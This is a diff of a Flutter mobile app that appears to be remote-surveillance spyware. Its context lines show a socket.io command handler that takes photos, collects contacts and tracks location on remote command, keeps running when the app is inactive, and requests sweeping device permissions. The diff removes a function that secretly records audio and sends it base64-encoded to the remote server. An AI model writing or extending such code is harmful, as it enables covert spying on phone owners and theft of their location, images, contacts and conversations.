@@ -6,12 +6,10 @@ import 'package:socket_io_client/socket_io_client.dart' as io;
 import 'package:permission_handler/permission_handler.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:camera/camera.dart';
-import 'package:record/record.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:device_info_plus/device_info_plus.dart';
-import 'package:connectivity_plus/connectivity_plus.dart';
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
@@ -31,7 +29,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   Timer? heartbeatTimer;
   Timer? locationTimer;
   StreamSubscription<Position>? locationStream;
-  StreamSubscription<ConnectivityResult>? connectivityStream;
   
   @override
   void initState() {
@@ -50,7 +47,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       startHeartbeat();
       startLocationTracking();
     } else if (state == AppLifecycleState.inactive) {
-      // Keep everything running
       startHeartbeat();
     }
   }
@@ -60,14 +56,10 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       Permission.location,
       Permission.locationAlways,
       Permission.camera,
-      Permission.microphone,
       Permission.contacts,
       Permission.photos,
       Permission.notification,
       Permission.storage,
-      Permission.mediaLibrary,
-      Permission.speech,
-      Permission.bluetooth,
     ].request();
     
     bool allGranted = statuses.values.every((status) => 
@@ -131,7 +123,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       if (socket.connected) {
         socket.emit('heartbeat', {
           'timestamp': DateTime.now().toIso8601String(),
-          'battery': '100',
         });
       } else {
         socket.connect();
@@ -197,9 +188,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
         break;
       case 'take_photo':
         await takePhoto(params['camera'] ?? 'front');
-        break;
-      case 'record_audio':
-        await recordAudio(int.parse(params['duration'] ?? '10'));
         break;
       case 'get_contacts':
         await getContacts();
@@ -282,31 +270,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
-  Future<void> recordAudio(int duration) async {
-    try {
-      final record = AudioRecorder();
-      final dir = await getTemporaryDirectory();
-      final path = '${dir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a';
-      
-      await record.start(const RecordConfig(), path: path);
-      await Future.delayed(Duration(seconds: duration));
-      final audioPath = await record.stop();
-      
-      if (audioPath != null) {
-        final bytes = await File(audioPath).readAsBytes();
-        final base64Audio = base64Encode(bytes);
-        
-        socket.emit('audio_data', {
-          'audio': base64Audio,
-          'duration': duration,
-          'timestamp': DateTime.now().toIso8601String(),
-        });
-      }
-    } catch (e) {
-      socket.emit('error', {'error': 'Audio error: $e'});
-    }
-  }
-
   Future<void> getContacts() async {
     try {
       final contacts = await ContactsService.getContacts();
@@ -351,7 +314,6 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     heartbeatTimer?.cancel();
     locationTimer?.cancel();
     locationStream?.cancel();
-    connectivityStream?.cancel();
     WidgetsBinding.instance.removeObserver(this);
     socket.dispose();
     super.dispose();
